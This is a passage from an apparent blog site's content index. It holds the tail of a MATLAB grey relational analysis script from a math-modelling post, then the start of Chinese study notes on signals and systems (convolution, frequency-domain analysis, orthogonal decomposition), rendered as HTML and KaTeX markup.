operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token number">0.48118</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token number">0.54342</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">1.01049</span> <span class="token operator">-</span><span class="token number">1.2482</span> <span class="token operator">-</span><span class="token number">1.06847</span> <span class="token operator">-</span><span class="token number">0.81916</span> <span class="token operator">-</span><span class="token number">0.37852</span> <span class="token number">1.41303</span> <span class="token number">1.57537</span> <span class="token number">2.24792</span> <span class="token number">0.17228</span> <span class="token number">1.19271</span> <span class="token number">0.3868</span> <span class="token number">0.61292</span> <span class="token number">1.51159</span> <span class="token operator">-</span><span class="token number">0.1466</span> <span class="token number">0.3868</span> <span class="token operator">-</span><span class="token number">1.46272</span> <span class="token operator">-</span><span class="token number">0.76118</span> <span class="token operator">-</span><span class="token number">0.7032</span> <span class="token number">0.56074</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.86124</span> <span class="token operator">-</span><span class="token number">0.86124</span> <span class="token operator">-</span><span class="token number">0.86124</span> <span class="token operator">-</span><span class="token number">0.86124</span> <span class="token operator">-</span><span class="token number">0.86124</span> <span class="token number">3.03422</span> <span class="token number">0.40871</span> <span class="token number">0.49432</span> <span class="token number">1.3362</span> <span class="token number">1.23631</span> <span class="token operator">-</span><span class="token number">0.19059</span> <span class="token number">0.83678</span> <span class="token number">1.20778</span> <span class="token operator">-</span><span class="token number">0.07644</span> <span class="token number">0.9652</span> <span class="token number">0.72263</span> <span class="token operator">-</span><span class="token number">0.86124</span> <span class="token operator">-</span><span class="token number">0.86124</span> <span class="token number">0.26602</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.53585</span> <span class="token operator">-</span><span class="token number">0.54356</span> <span class="token operator">-</span><span class="token number">0.16943</span> <span class="token operator">-</span><span class="token number">0.96783</span> <span class="token operator">-</span><span class="token number">0.98711</span> <span class="token number">0.1237</span> <span class="token operator">-</span><span class="token number">0.29286</span> <span class="token number">0.15456</span> <span class="token number">4.10411</span> <span class="token number">0.91438</span> <span class="token operator">-</span><span class="token number">0.43942</span> <span class="token number">0.86424</span> <span class="token operator">-</span><span class="token number">0.19257</span> <span class="token operator">-</span><span class="token number">0.71327</span> <span class="token number">0.43997</span> <span class="token number">0.24712</span> <span class="token operator">-</span><span class="token number">0.44714</span> <span class="token operator">-</span><span class="token number">0.31985</span> <span class="token number">0.19698</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.18267</span> <span class="token operator">-</span><span class="token number">0.38351</span> <span class="token operator">-</span><span class="token number">0.42368</span> <span class="token operator">-</span><span class="token number">0.81198</span> <span class="token operator">-</span><span class="token number">0.55758</span> <span class="token number">1.58475</span> <span class="token number">0.20563</span> <span class="token number">1.04917</span> <span class="token number">0.92866</span> <span class="token number">2.85676</span> <span class="token operator">-</span><span class="token number">0.37013</span> <span class="token number">0.78138</span> <span class="token operator">-</span><span class="token number">0.24962</span> <span class="token operator">-</span><span class="token number">0.50402</span> <span class="token operator">-</span><span class="token number">0.81198</span> <span class="token operator">-</span><span class="token number">0.81198</span> <span class="token operator">-</span><span class="token number">0.81198</span> <span class="token operator">-</span><span class="token number">0.81198</span> <span class="token number">0.33952</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.21803</span> <span class="token operator">-</span><span class="token number">0.63577</span> <span class="token operator">-</span><span class="token number">0.6106</span> <span class="token operator">-</span><span class="token number">0.53511</span> <span class="token operator">-</span><span class="token number">0.97801</span> <span class="token operator">-</span><span class="token number">0.88238</span> <span class="token number">1.71462</span> <span class="token operator">-</span><span class="token number">0.21803</span> <span class="token operator">-</span><span class="token number">0.97801</span> <span class="token operator">-</span><span class="token number">0.6257</span> <span class="token operator">-</span><span class="token number">0.40929</span> <span class="token operator">-</span><span class="token number">0.2885</span> <span class="token operator">-</span><span class="token number">0.60054</span> <span class="token operator">-</span><span class="token number">0.6257</span> <span class="token operator">-</span><span class="token number">0.56027</span> <span class="token operator">-</span><span class="token number">0.30359</span> <span class="token operator">-</span><span class="token number">0.58041</span> <span class="token operator">-</span><span class="token number">0.39419</span> <span class="token number">0.5973</span><span class="token punctuation">;</span><span class="token number">0.54957</span> <span class="token number">0.22954</span> <span class="token number">0.72837</span> <span class="token number">1.50511</span> <span class="token operator">-</span><span class="token number">1.99899</span> <span class="token number">0.39214</span> <span class="token number">1.41118</span> <span class="token number">0.43296</span> <span class="token operator">-</span><span class="token number">1.44834</span> <span class="token operator">-</span><span class="token number">0.2518</span> <span class="token number">0.38437</span> <span class="token operator">-</span><span class="token number">2.19139</span> <span class="token number">0.85988</span> <span class="token number">0.60593</span> <span class="token number">1.12678</span> <span class="token number">1.32113</span> <span class="token number">0.20622</span> <span class="token number">0.45563</span> <span class="token number">0.08313</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">1.00644</span> <span class="token operator">-</span><span class="token number">0.92412</span> <span class="token operator">-</span><span class="token number">0.13464</span> <span class="token operator">-</span><span class="token number">0.38953</span> <span class="token operator">-</span><span class="token number">0.4421</span> <span class="token operator">-</span><span class="token number">0.13761</span> <span class="token operator">-</span><span class="token number">0.38259</span> <span class="token operator">-</span><span class="token number">0.78229</span> <span class="token operator">-</span><span class="token number">0.38061</span> <span class="token operator">-</span><span class="token number">0.50061</span> <span class="token number">0.30275</span> <span class="token operator">-</span><span class="token number">0.21894</span> <span class="token operator">-</span><span class="token number">1.10562</span> <span class="token operator">-</span><span class="token number">0.2487</span> <span class="token operator">-</span><span class="token number">0.37168</span> <span class="token operator">-</span><span class="token number">1.10562</span> <span class="token number">0.42672</span> <span class="token number">0.61021</span> <span class="token operator">-</span><span class="token number">0.34589</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">1.16317</span> <span class="token operator">-</span><span class="token number">1.07604</span> <span class="token operator">-</span><span class="token number">1.12929</span> <span class="token operator">-</span><span class="token number">0.96471</span> <span class="token operator">-</span><span class="token number">0.81708</span> <span class="token number">0.56002</span> <span class="token operator">-</span><span class="token number">1.24546</span> <span class="token number">1.85967</span> <span class="token operator">-</span><span class="token number">0.97923</span> <span class="token number">1.44097</span> <span class="token number">0.28896</span> <span class="token number">0.71491</span> <span class="token number">0.87223</span> <span class="token number">0.13648</span> <span class="token operator">-</span><span class="token number">0.21929</span> <span class="token number">2.1743</span> <span class="token operator">-</span><span class="token number">0.63072</span> <span class="token operator">-</span><span class="token number">1.24546</span> <span class="token number">0.93031</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.70924</span> <span class="token operator">-</span><span class="token number">0.70924</span> <span class="token operator">-</span><span class="token number">0.03905</span> <span class="token number">0.66641</span> <span class="token number">0.91332</span> <span class="token number">0.17259</span> <span class="token number">0.77223</span> <span class="token number">0.17259</span> <span class="token operator">-</span><span class="token number">0.60342</span> <span class="token number">0.13731</span> <span class="token number">0.84278</span> <span class="token operator">-</span><span class="token number">0.1096</span> <span class="token operator">-</span><span class="token number">1.48525</span> <span class="token number">0.06677</span> <span class="token number">1.61879</span> <span class="token number">2.46535</span> <span class="token operator">-</span><span class="token number">1.48525</span> <span class="token operator">-</span><span class="token number">1.48525</span> <span class="token operator">-</span><span class="token number">0.6387</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token number">4.79574</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token number">1.56377</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span><span class="token punctuation">;</span><span class="token punctuation">]</span><span class="token comment">%原始数据14行19列</span>x<span class="token operator">=</span>x1<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">14</span>  <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">19</span>    <span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">x1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span>  <span class="token keyword">end</span><span class="token keyword">end</span>x1<span class="token operator">=</span>x<span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">14</span>  <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">19</span>    <span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">x1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">end</span><span class="token keyword">end</span>max<span class="token operator">=</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>min<span class="token operator">=</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">14</span>  <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">19</span>    <span class="token keyword">if</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">>=</span>max      max<span class="token operator">=</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span><span class="token keyword">end</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">14</span>  <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">19</span>    <span class="token keyword">if</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>min      min<span class="token operator">=</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span><span class="token keyword">end</span>k<span class="token operator">=</span><span class="token number">0.5</span> <span class="token comment">%分辨系数取值</span>l<span class="token operator">=</span><span class="token punctuation">(</span>min<span class="token operator">+</span>k<span class="token operator">*</span>max<span class="token punctuation">)</span><span class="token operator">./</span><span class="token punctuation">(</span>x<span class="token operator">+</span>k<span class="token operator">*</span>max<span class="token punctuation">)</span><span class="token comment">%求关联系数矩阵</span>guanlianxing<span class="token operator">=</span><span class="token function">sum</span><span class="token punctuation">(</span>l<span class="token operator">'</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">1</span><span class="token punctuation">[</span>rs<span class="token punctuation">,</span>rind<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">sort</span><span class="token punctuation">(</span>guanlianxing<span class="token punctuation">,</span><span class="token string">'descend'</span><span class="token punctuation">)</span> <span class="token comment">%对关联度进行排序</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="附录5-表单2数据规律统计表"><a href="#附录5-表单2数据规律统计表" class="headerlink" title="附录5 表单2数据规律统计表"></a>附录5 表单2数据规律统计表</h4>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学建模 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信号与系统补充知识</title>
      <link href="/2022/11/01/%E4%BF%A1%E5%8F%B7%E4%B8%8E%E7%B3%BB%E7%BB%9F%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/"/>
      <url>/2022/11/01/%E4%BF%A1%E5%8F%B7%E4%B8%8E%E7%B3%BB%E7%BB%9F%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1>引言</h1><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001142352445.png" alt="image-20221001142352445" style="zoom:80%;" /><h2 id="时域分析-连续信号">时域分析（连续信号）</h2><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001142709864.png" alt="image-20221001142709864"></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mo>∗</mo><mi>δ</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mo>=</mo><msubsup><mo>∫</mo><mrow><mo>−</mo><mi mathvariant="normal">∞</mi></mrow><mi mathvariant="normal">∞</mi></msubsup><mi>f</mi><mo stretchy="false">(</mo><mi>τ</mi><mo stretchy="false">)</mo><mi>δ</mi><mo stretchy="false">(</mo><mi>t</mi><mo>−</mo><mi>τ</mi><mo stretchy="false">)</mo><mi>d</mi><mi>τ</mi></mrow><annotation encoding="application/x-tex">f(t)=f(t)*\delta(t)=\int_{-\infty}^{\infty}f(\tau)\delta(t-\tau)d\tau</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.273443em;vertical-align:-0.41415100000000005em;"></span><span class="mop"><span class="mop op-symbol small-op" style="margin-right:0.19445em;position:relative;top:-0.0005599999999999772em;">∫</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8592920000000001em;"><span style="top:-2.34418em;margin-left:-0.19445em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">∞</span></span></span></span><span style="top:-3.2579000000000002em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∞</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.41415100000000005em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span><span class="mclose">)</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span></span></span></span></p><p>​基本信号求出基本响应。任意信号可以分解为基本信号的线性组合（求和式）：连续-&gt;卷积积分，所以知道分解就可以求出复杂输入信号的响应。</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001145109238.png" alt="image-20221001145109238" style="zoom:50%;" /><p>时域分析的要点：以冲激函数为基本信号，任意输入信号可分解为一系列冲击函数；而</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mrow><mi>z</mi><mi>s</mi></mrow></msub><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mo>=</mo><mi>h</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mo>∗</mo><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mspace width="2em"/><mo stretchy="false">(</mo><mtext>卷积</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y_{zs}(t)=h(t)*f(t)\qquad(卷积)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.04398em;">z</span><span class="mord mathdefault mtight">s</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">h</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:2em;"></span><span class="mopen">(</span><span class="mord cjk_fallback">卷</span><span class="mord cjk_fallback">积</span><span class="mclose">)</span></span></span></span></span></p><h2 id="频域分析">频域分析</h2><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001145653880.png" alt="image-20221001145653880"></p><p>系统分析的独立变量是频率，分析是在频率空间进行的，故称为频率域分析，简称<strong>频域分析（傅里叶分析）</strong>。</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220911200849193.png" alt="image-20220911200849193" style="zoom:67%;" /><p>​频域分析法要点<strong>以正弦信号和虚指数信号为基本信号</strong>，将任意输入信号分解为一系列不同频率的正弦信号或虚指数信号之和，再利用LTI性质求出系统的响应。</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001145818018.png" alt="image-20221001145818018" style="zoom: 50%;" /><h1>信号分解为正交函数</h1><p><strong>信号怎样分解最有效？信号分解为正交函数</strong></p><p>信号 -&gt; 矢量</p><ul><li>信号分解 -&gt; 矢量分解 -&gt; 矢量正交 -&gt; 信号正交</li><li>信号 -&gt; 正交集/分解成正交信号的组合</li></ul><h2 id="矢量的正交分解">矢量的正交分解</h2><ul><li><p>矢量正交：2个矢量的点积/内积为0</p></li><li><p>正交矢量集：n对正交矢量的集合</p></li><li><p>非正交矢量的近似表示及误差 -&gt; 误差最小<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>θ</mi><msub><mi>V</mi><mi>e</mi></msub></msub><mo>=</mo><mn>9</mn><msup><mn>0</mn><mi>o</mi></msup></mrow><annotation encoding="application/x-tex">\theta_{V_{e}}=90^{o}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9445399999999999em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:-0.22222em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord">9</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">o</span></span></span></span></span></span></span></span></span></span></span></span></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001150350703.png" alt="image-20221001150350703"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo><mover><mo><msub><mi>V</mi><mi>e</mi></msub></mo><mo lspace="0em" rspace="0em">⇀</mo></mover></mo><mo><mover><mo><mo>=</mo></mo><mi mathvariant="normal">Δ</mi></mover></mo><mo><mover><mo><msub><mi>V</mi><mn>1</mn></msub></mo><mo lspace="0em" rspace="0em">⇀</mo></mover></mo><mo>−</mo><msub><mi>c</mi><mn>12</mn></msub><mo><mover><mo><msub><mi>V</mi><mn>2</mn></msub></mo><mo lspace="0em" rspace="0em">⇀</mo></mover></mo><mspace linebreak="newline"></mspace><mtext>用与</mtext><msub><mi>V</mi><mn>2</mn></msub><mtext>成比例的矢量</mtext><msub><mi>c</mi><mn>12</mn></msub><mo><mover><mo><msub><mi>V</mi><mn>2</mn></msub></mo><mo lspace="0em" rspace="0em">⇀</mo></mover></mo><mtext>近似表示</mtext><mo><mover><mo><msub><mi>V</mi><mn>1</mn></msub></mo><mo lspace="0em" rspace="0em">⇀</mo></mover></mo><mspace linebreak="newline"></mspace><mi mathvariant="normal">∣</mi><msub><mi>c</mi><mn>12</mn></msub><mo><mover><mo><msub><mi>V</mi><mn>2</mn></msub></mo><mo lspace="0em" rspace="0em">⇀</mo></mover></mo><mi mathvariant="normal">∣</mi><mo>=</mo><mi mathvariant="normal">∣</mi><mo><mover><mo><msub><mi>V</mi><mn>1</mn></msub></mo><mo lspace="0em" rspace="0em">⇀</mo></mover></mo><mi mathvariant="normal">∣</mi><mi>cos</mi><mo>⁡</mo><mi>θ</mi><mspace linebreak="newline"></mspace><msub><mi>c</mi><mn>12</mn></msub><mo>=</mo><mfrac><mrow><mi mathvariant="normal">∣</mi><mo><mover><mo><msub><mi>V</mi><mn>1</mn></msub></mo><mo lspace="0em" rspace="0em">⇀</mo></mover></mo><mi mathvariant="normal">∣</mi><mi>cos</mi><mo>⁡</mo><mi>θ</mi></mrow><mrow><mi mathvariant="normal">∣</mi><mo><mover><mo><msub><mi>V</mi><mn>2</mn></msub></mo><mo lspace="0em" rspace="0em">⇀</mo></mover></mo><mi mathvariant="normal">∣</mi></mrow></mfrac><mo>=</mo><mrow><mi mathvariant="normal">∣</mi><mo><mover><mo><msub><mi>V</mi><mn>1</mn></msub></mo><mo lspace="0em" rspace="0em">⇀</mo></mover></mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mo><mover><mo><msub><mi>V</mi><mn>2</mn></msub></mo><mo lspace="0em" rspace="0em">⇀</mo></mover></mo><mi mathvariant="normal">∣</mi><mi>cos</mi><mo>⁡</mo><mi>θ</mi></mrow><mrow><mi mathvariant="normal">∣</mi><mo><mover><mo><msub><mi>V</mi><mn>2</mn></msub></mo><mo lspace="0em" rspace="0em">⇀</mo></mover></mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mo><mover><mo><msub><mi>V</mi><mn>2</mn></msub></mo><mo lspace="0em" rspace="0em">⇀</mo></mover></mo><mi mathvariant="normal">∣</mi></mrow><mo>=</mo><mfrac><mrow><mo><mover><mo><msub><mi>V</mi><mn>1</mn></msub></mo><mo lspace="0em" rspace="0em">⇀</mo></mover></mo><mo>⋅</mo><mo><mover><mo><msub><mi>V</mi><mn>2</mn></msub></mo><mo lspace="0em" rspace="0em">⇀</mo></mover></mo></mrow><mrow><mo><mover><mo><msub><mi>V</mi><mn>2</mn></msub></mo><mo lspace="0em" rspace="0em">⇀</mo></mover></mo><mo>⋅</mo><mo><mover><mo><msub><mi>V</mi><mn>2</mn></msub></mo><mo lspace="0em" rspace="0em">⇀</mo></mover></mo></mrow></mfrac><mspace linebreak="newline"></mspace><mtext>推广</mtext><mo>:</mo><msub><mi>c</mi><mrow><mn>1</mn><mi>r</mi></mrow></msub><mo>=</mo><mfrac><mrow><mo><mover><mo><msub><mi>V</mi><mn>1</mn></msub></mo><mo lspace="0em" rspace="0em">⇀</mo></mover></mo><mo>⋅</mo><mo><mover><mo><msub><mi>V</mi><mi>r</mi></msub></mo><mo lspace="0em" rspace="0em">⇀</mo></mover></mo></mrow><mrow><mo><mover><mo><msub><mi>V</mi><mi>r</mi></msub></mo><mo lspace="0em" rspace="0em">⇀</mo></mover></mo><mo>⋅</mo><mo><mover><mo><msub><mi>V</mi><mi>r</mi></msub></mo><mo lspace="0em" rspace="0em">⇀</mo></mover></mo></mrow></mfrac><mspace width="2em"/><mo><mover><mo><msub><mi>V</mi><mi>r</mi></msub></mo><mo lspace="0em" rspace="0em">⇀</mo></mover></mo><mtext>是分量</mtext><mspace 